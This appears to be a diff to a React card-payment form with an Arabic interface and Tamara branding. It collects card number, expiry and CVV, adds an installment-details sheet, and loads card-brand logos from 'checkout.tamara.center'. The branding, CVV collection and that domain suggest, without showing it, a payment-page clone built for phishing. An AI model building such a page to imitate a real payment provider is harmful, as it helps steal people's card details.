@@ -1,3 +1,4 @@
+import { useState } from 'react';
 import { toEnglishNumbers, formatPrice } from '@/lib/utils';
 import TamaraLogo from '@/components/TamaraLogo';
 
@@ -59,39 +60,14 @@ const isValidExpiry = (value: string): boolean => {
   return expiry >= new Date(now.getFullYear(), now.getMonth());
 };
 
-// Card brand icons component - small version for inside input
+// Card brand icons for inside input field
 const CardBrandIcons = () => (
-  <div className="flex items-center gap-1">
-    {/* Amex */}
-    <div className="w-8 h-5 bg-[#016FD0] rounded flex items-center justify-center">
-      <svg width="16" height="10" viewBox="0 0 32 20" fill="none" xmlns="http://www.w3.org/2000/svg">
-        <path d="M4 10H6L7 7.5L8 10H10L8.5 6L10 2H8L7 4.5L6 2H4L5.5 6L4 10Z" fill="white"/>
-      </svg>
-    </div>
-    {/* Visa */}
-    <div className="w-8 h-5 bg-white rounded flex items-center justify-center">
-      <svg width="20" height="6" viewBox="0 0 48 16" fill="none" xmlns="http://www.w3.org/2000/svg">
-        <path d="M17.68 1.5L15.52 14.5H19.36L21.52 1.5H17.68ZM12.16 1.5L8.48 9.86L7.84 7.34C6.88 4.54 4.16 2.54 1.12 1.5H1.2L5.92 14.5H10.08L16.32 1.5H12.16Z" fill="#1A1F71"/>
-      </svg>
-    </div>
-    {/* Mastercard */}
-    <div className="w-8 h-5 bg-white rounded flex items-center justify-center">
-      <svg width="14" height="8" viewBox="0 0 32 20" fill="none" xmlns="http://www.w3.org/2000/svg">
-        <circle cx="10" cy="10" r="10" fill="#EB001B"/>
-        <circle cx="22" cy="10" r="10" fill="#F79E1B"/>
-        <path d="M16 3C17.66 4.89 18.5 7.35 18.5 10C18.5 12.65 17.66 15.11 16 17C14.34 15.11 13.5 12.65 13.5 10C13.5 7.35 14.34 4.89 16 3Z" fill="#FF5F00"/>
-      </svg>
-    </div>
-    {/* Mada */}
-    <div className="w-8 h-5 bg-white rounded flex items-center justify-center">
-      <svg width="18" height="6" viewBox="0 0 48 16" fill="none" xmlns="http://www.w3.org/2000/svg">
-        <path d="M8 0H0V16H8C12.4183 16 16 12.4183 16 8C16 3.58172 12.4183 0 8 0Z" fill="#00A651"/>
-        <path d="M24 0H16V16H24C28.4183 16 32 12.4183 32 8C32 3.58172 28.4183 0 24 0Z" fill="#8DC63F"/>
-        <path d="M40 0H32V16H40C44.4183 16 48 12.4183 48 8C48 3.58172 44.4183 0 40 0Z" fill="#ED1C24"/>
-        <path d="M8 0C3.58172 0 0 3.58172 0 8C0 12.4183 3.58172 16 8 16V0Z" fill="#0072CE"/>
-      </svg>
-    </div>
-  </div>
+  <span className="brand-logos-inside" aria-hidden="true">
+    <img src="https://checkout.tamara.center/v.jpg" alt="American Express" />
+    <img src="https://checkout.tamara.center/vv.jpg" alt="Visa" />
+    <img src="https://checkout.tamara.center/vvv.jpg" alt="Mastercard" />
+    <img src="https://checkout.tamara.center/vvvv.jpg" alt="Mada" />
+  </span>
 );
 
 const CardInfo = ({
@@ -107,6 +83,9 @@ const CardInfo = ({
   onSubmit,
   selectedPlan,
 }: CardInfoProps) => {
+  const [showPlanDetails, setShowPlanDetails] = useState(false);
+  const [selectedInstallment, setSelectedInstallment] = useState<number | null>(null);
+  
   const expiryInvalid = cardExpiry.length > 0 && !isValidExpiry(cardExpiry);
   const isFormValid = !!(cardNumber && cardExpiry && cardCvv && isValidExpiry(cardExpiry));
 
@@ -138,6 +117,24 @@ const CardInfo = ({
   const exchangeRate = 3.75;
   const monthlyAmountUSD = selectedPlan ? Math.round(selectedPlan.perInstallment / exchangeRate) : 0;
   const totalAmountUSD = selectedPlan ? Math.round(selectedPlan.totalAmount / exchangeRate) : 0;
+
+  // Generate installment items
+  const generateInstallments = () => {
+    if (!selectedPlan) return [];
+    const items = [];
+    for (let i = 1; i <= selectedPlan.installmentsCount; i++) {
+      const date = new Date();
+      date.setMonth(date.getMonth() + i);
+      items.push({
+        number: i,
+        amount: selectedPlan.perInstallment,
+        date: date.toLocaleDateString('ar-SA', { month: 'long', year: 'numeric' })
+      });
+    }
+    return items;
+  };
+
+  const installments = generateInstallments();
 
   return (
     <div
@@ -174,21 +171,22 @@ const CardInfo = ({
         <div className="h-px bg-gray-200" />
 
         {/* Content */}
-        <div className="px-5 py-6 flex flex-col flex-1">
+        <div className="flex flex-col flex-1" style={{ paddingBottom: '80px' }}>
+          {/* Page Title */}
+          <h1 className="page-title">دفع آمن</h1>
+
           {/* Card Form Section */}
-          <div className="mb-6">
-            {/* Title with Radio Circle */}
-            <div className="flex items-center gap-3 mb-4">
-              <div className="w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">
-                <div className="w-2.5 h-2.5 rounded-full bg-gray-400" />
+          <div className="card-form-section">
+            {/* Card Header */}
+            <div className="card-header">
+              <div className="flex items-center gap-2">
+                <div className="radio-circle" />
+                <span className="add-card-text">أضف بطاقة جديدة</span>
               </div>
-              <h1 className="text-[20px] font-bold text-right" style={{ color: '#1A1F71' }}>
-                أضف بطاقة جديدة
-              </h1>
             </div>
 
-            {/* Card Number Input with Brand Icons */}
-            <div className="mb-4">
+            {/* Card Number Input with Brand Icons Inside */}
+            <div className="card-number-input-container" style={{ padding: '0 20px' }}>
               <label 
                 className="text-[13px] font-medium block mb-2 text-right"
                 style={{ color: '#4B5563' }}
@@ -197,29 +195,26 @@ const CardInfo = ({
               </label>
               <div className="relative">
                 <input
+                  id="card_number"
                   value={cardNumber}
                   onChange={handleCardNumberChange}
                   placeholder="0000 0000 0000 0000"
-                  className="w-full px-4 py-3 text-[15px] rounded-lg outline-none placeholder-[#9CA3AF] text-center"
+                  className="card-input-field"
                   style={{ 
-                    border: '1px solid #E5E7EB',
                     backgroundColor: '#FFFFFF',
                     color: '#1F2937',
                     letterSpacing: '0.15em',
-                    direction: 'ltr',
-                    boxShadow: '0 1px 2px rgba(0, 0, 0, 0.05)'
+                    direction: 'ltr'
                   }}
                   maxLength={19}
                 />
-                <div className="absolute left-3 top-1/2 -translate-y-1/2">
-                  <CardBrandIcons />
-                </div>
+                <CardBrandIcons />
               </div>
             </div>
 
-            {/* CVV and Expiry in One Row */}
-            <div className="grid grid-cols-2 gap-3">
-              <div>
+            {/* CVV and Expiry Row - No Gap */}
+            <div className="cvv-expiry-row" style={{ padding: '0 20px 20px' }}>
+              <div className="card-number-input-container">
                 <label 
                   className="text-[13px] font-medium block mb-2 text-right"
                   style={{ color: '#4B5563' }}
@@ -230,15 +225,17 @@ const CardInfo = ({
                   value={cardExpiry}
                   onChange={handleExpiryChange}
                   placeholder="MM/YY"
-                  className="w-full px-4 py-3 text-[15px] rounded-lg outline-none placeholder-[#9CA3AF] text-center"
+                  className="card-input-field"
                   style={{ 
                     border: expiryInvalid 
                       ? '1px solid #EF4444' 
-                      : '1px solid #E5E7EB',
+                      : 'none',
+                    borderBottom: expiryInvalid 
+                      ? 'none' 
+                      : '1px solid var(--purple-line)',
                     backgroundColor: '#FFFFFF',
                     color: '#1F2937',
-                    direction: 'ltr',
-                    boxShadow: '0 1px 2px rgba(0, 0, 0, 0.05)'
+                    direction: 'ltr'
                   }}
                   maxLength={5}
                 />
@@ -246,7 +243,7 @@ const CardInfo = ({
                   <p className="text-xs mt-1 text-right" style={{ color: '#EF4444' }}>تاريخ انتهاء غير صالح</p>
                 )}
               </div>
-              <div>
+              <div className="card-number-input-container">
                 <label 
                   className="text-[13px] font-medium block mb-2 text-right"
                   style={{ color: '#4B5563' }}
@@ -258,13 +255,13 @@ const CardInfo = ({
                   onChange={e => setCardCvv(toEnglishNumbers(e.target.value))}
                   placeholder="•••"
                   type="password"
-                  className="w-full px-4 py-3 text-[15px] rounded-lg outline-none placeholder-[#9CA3AF] text-center"
+                  className="card-input-field"
                   style={{ 
-                    border: '1px solid #E5E7EB',
+                    border: 'none',
+                    borderBottom: '1px solid var(--purple-line)',
                     backgroundColor: '#FFFFFF',
                     color: '#1F2937',
-                    direction: 'ltr',
-                    boxShadow: '0 1px 2px rgba(0, 0, 0, 0.05)'
+                    direction: 'ltr'
                   }}
                   maxLength={4}
                 />
@@ -272,64 +269,95 @@ const CardInfo = ({
             </div>
           </div>
 
-          {/* Plan Selection Section */}
+          {/* Plan Section */}
           {selectedPlan && (
-            <div 
-              className="mb-6 p-4 rounded-xl"
-              style={{ 
-                background: '#FFFFFF',
-                border: '1px solid #E5E7EB',
-                boxShadow: '0 1px 3px rgba(0, 0, 0, 0.08)'
-              }}
-            >
-              <div className="flex items-center justify-between mb-3">
-                <span className="text-[14px] font-medium" style={{ color: '#6B7280' }}>
-                  اختر الخطة
-                </span>
-                <span 
-                  className="px-3 py-1 rounded-full text-[12px] font-semibold"
-                  style={{ 
-                    background: '#EEF2FF',
-                    color: '#4F46E5'
-                  }}
-                >
-                  {selectedPlan.installmentsCount} دفعات
-                </span>
-              </div>
+            <>
+              <div className="plan-title">الخطة</div>
               
-              {/* Monthly Amount */}
-              <div className="mb-3">
-                <div className="text-[28px] font-bold text-right" style={{ color: '#1F2937' }}>
-                  {formatPrice(selectedPlan.perInstallment)} <span className="text-[16px] font-normal">ريال</span>
-                </div>
-                <div className="text-[14px]" style={{ color: '#6B7280' }}>
-                  {monthlyAmountUSD} دولار / شهر
+              <div 
+                className="plan-box"
+                onClick={() => setShowPlanDetails(!showPlanDetails)}
+              >
+                <div className="plan-header">
+                  <div className="plan-details">
+                    <div className="monthly-amount">
+                      <span className="usd-badge">
+                        <small>$</small>{monthlyAmountUSD}
+                      </span>
+                      {formatPrice(selectedPlan.perInstallment)} ريال
+                    </div>
+                    <div className="total-amount-details">
+                      الإجمالي: {formatPrice(selectedPlan.totalAmount)} ريال ({totalAmountUSD} $)
+                    </div>
+                  </div>
+                  <span className={`arrow-icon ${showPlanDetails ? 'rotated' : ''}`}>›</span>
                 </div>
               </div>
 
-              {/* Payments and Total */}
-              <div className="flex items-center justify-between pt-3 border-t" style={{ borderColor: '#E5E7EB' }}>
-                <div>
-                  <div className="text-[12px]" style={{ color: '#9CA3AF' }}>المبلغ الإجمالي</div>
-                  <div className="text-[16px] font-semibold" style={{ color: '#1F2937' }}>
-                    {formatPrice(selectedPlan.totalAmount)} ريال
-                  </div>
-                  <div className="text-[12px]" style={{ color: '#9CA3AF' }}>
-                    {totalAmountUSD} دولار
-                  </div>
+              {/* Bottom Sheet for Installment Details */}
+              <div className={`bottom-sheet ${showPlanDetails ? 'active' : ''}`}>
+                <div className="bottom-sheet-header">
+                  <span>تفاصيل الدفعات</span>
+                  <button 
+                    className="bottom-sheet-close"
+                    onClick={(e) => { e.stopPropagation(); setShowPlanDetails(false); }}
+                  >
+                    ×
+                  </button>
                 </div>
-                <div 
-                  className="w-10 h-10 rounded-full flex items-center justify-center"
-                  style={{ 
-                    background: '#4F46E5'
-                  }}
-                >
-                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M9 18L15 12L9 6" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
-                  </svg>
+                
+                <span className="installment-plan-badge">
+                  {selectedPlan.installmentsCount} دفعات
+                </span>
+
+                <div className="installment-list">
+                  {installments.map((item, index) => (
+                    <div 
+                      key={index}
+                      className="installment-item"
+                      onClick={() => setSelectedInstallment(index)}
+                    >
+                      <div className="installment-left">
+                        <span 
+                          className="radio-fake"
+                          style={{
+                            borderColor: selectedInstallment === index ? 'var(--purple)' : '#777',
+                            background: selectedInstallment === index ? 'var(--purple)' : 'transparent'
+                          }}
+                        />
+                        <span className="installment-date">الدفعة {item.number} - {item.date}</span>
+                      </div>
+                      <div className="installment-amount">
+                        <span className="usd-badge" style={{ marginRight: 0 }}>
+                          <small>$</small>{Math.round(item.amount / exchangeRate)}
+                        </span>
+                        {formatPrice(item.amount)} ريال
+                      </div>
+                    </div>
+                  ))}
+                </div>
+
+                <div className="installment-total">
+                  الإجمالي: {formatPrice(selectedPlan.totalAmount)} ريال ({totalAmountUSD} $)
                 </div>
               </div>
-            </div>
+
+              {/* Overlay when bottom sheet is active */}
+              {showPlanDetails && (
+                <div 
+                  style={{
+                    position: 'fixed',
+                    top: 0,
+                    left: 0,
+                    right: 0,
+                    bottom: 0,
+                    background: 'rgba(0,0,0,0.3)',
+                    zIndex: 9998
+                  }}
+                  onClick={() => setShowPlanDetails(false)}
+                />
+              )}
+            </>
           )}
 
           {/* Spacer */}
@@ -337,37 +365,16 @@ const CardInfo = ({
         </div>
 
         {/* Fixed Bottom Button - Payment Button */}
-        <div 
-          className="fixed bottom-0 left-0 right-0 p-4 bg-white"
-          style={{ 
-            borderTop: '1px solid #E5E7EB'
-          }}
+        <button
+          onClick={onSubmit}
+          disabled={!isFormValid}
+          className={`payment-btn ${isFormValid ? 'active' : ''}`}
         >
-          <div className="max-w-2xl mx-auto">
-            <button
-              onClick={onSubmit}
-              disabled={!isFormValid}
-              className="w-full py-4 font-bold rounded-xl transition-all flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed"
-              style={{
-                background: isFormValid 
-                  ? '#4F46E5' 
-                  : '#D1D5DB',
-                color: '#FFFFFF',
-                cursor: isFormValid ? 'pointer' : 'not-allowed',
-                boxShadow: isFormValid ? '0 4px 12px -2px rgba(79, 70, 229, 0.4)' : 'none'
-              }}
-            >
-              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <rect x="2" y="5" width="20" height="14" rx="2" stroke="currentColor" strokeWidth="2"/>
-                <line x1="2" y1="10" x2="22" y2="10" stroke="currentColor" strokeWidth="2"/>
-              </svg>
-              {selectedPlan 
-                ? `ادفع ${formatPrice(selectedPlan.perInstallment)} ريال (${monthlyAmountUSD} $)`
-                : 'ادفع الآن'
-              }
-            </button>
-          </div>
-        </div>
+          {selectedPlan 
+            ? `ادفع ${formatPrice(selectedPlan.perInstallment)} ريال / شهر`
+            : 'ادفع الآن'
+          }
+        </button>
       </div>
     </div>
   );
